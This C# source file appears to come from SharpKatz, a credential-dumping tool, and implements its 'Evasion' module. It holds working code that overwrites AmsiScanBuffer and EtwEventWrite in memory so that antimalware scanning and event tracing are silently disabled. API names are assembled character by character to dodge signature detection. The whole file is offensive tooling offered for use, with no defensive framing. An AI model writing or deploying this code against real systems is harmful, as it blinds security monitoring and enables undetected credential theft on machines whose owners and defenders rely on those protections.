using System;
using System.Runtime.InteropServices;
using SharpKatz.Win32;

namespace SharpKatz.Evasion
{
    /// <summary>
    /// Runtime patches for AMSI and ETW to prevent in-memory detection.
    /// Uses dynamic API resolution to avoid static import signatures.
    /// </summary>
    internal static class PatchHelper
    {
        /// <summary>
        /// Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN.
        /// The patch overwrites the function prologue to force a clean return.
        /// </summary>
        public static bool PatchAmsi()
        {
            try
            {
                // Build "amsi.dll" dynamically to avoid string detection
                string amsiDll = new string(new char[] { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' });

                IntPtr hAmsi = CustomLoadLibrary.GetDllAddress(amsiDll, CanLoadFromDisk: true);
                if (hAmsi == IntPtr.Zero) return false;

                // Build "AmsiScanBuffer" dynamically
                string funcName = new string(new char[] { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' });

                IntPtr funcAddr = CustomLoadLibrary.GetExportAddress(hAmsi, funcName);
                if (funcAddr == IntPtr.Zero) return false;

                // x64 patch: mov eax, 0x80070057 (E_INVALIDARG); ret
                // This makes AmsiScanBuffer return E_INVALIDARG, causing AMSI to skip the scan
                byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

                // Change memory protection to RWX
                if (!Natives.VirtualProtect(funcAddr, (UIntPtr)patch.Length, 0x40, out uint oldProtect))
                    return false;

                Marshal.Copy(patch, 0, funcAddr, patch.Length);

                // Restore original protection
                Natives.VirtualProtect(funcAddr, (UIntPtr)patch.Length, oldProtect, out _);

                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Patch EtwEventWrite in ntdll.dll to immediately return 0 (STATUS_SUCCESS).
        /// This prevents ETW-based logging of .NET assembly loads and suspicious API calls.
        /// </summary>
        public static bool PatchEtw()
        {
            try
            {
                // Build "ntdll.dll" dynamically
                string ntdllName = new string(new char[] { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l' });

                IntPtr hNtdll = CustomLoadLibrary.GetDllAddress(ntdllName);
                if (hNtdll == IntPtr.Zero) return false;

                // Build "EtwEventWrite" dynamically
                string funcName = new string(new char[] { 'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e' });

                IntPtr funcAddr = CustomLoadLibrary.GetExportAddress(hNtdll, funcName);
                if (funcAddr == IntPtr.Zero) return false;

                // x64 patch: xor eax, eax; ret (return 0)
                byte[] patch = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };

                if (!Natives.VirtualProtect(funcAddr, (UIntPtr)patch.Length, 0x40, out uint oldProtect))
                    return false;

                Marshal.Copy(patch, 0, funcAddr, patch.Length);

                Natives.VirtualProtect(funcAddr, (UIntPtr)patch.Length, oldProtect, out _);

                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Apply all evasion patches. Call this before any sensitive operations.
        /// </summary>
        public static void ApplyAll()
        {
            PatchEtw();
            PatchAmsi();
        }
    }
}
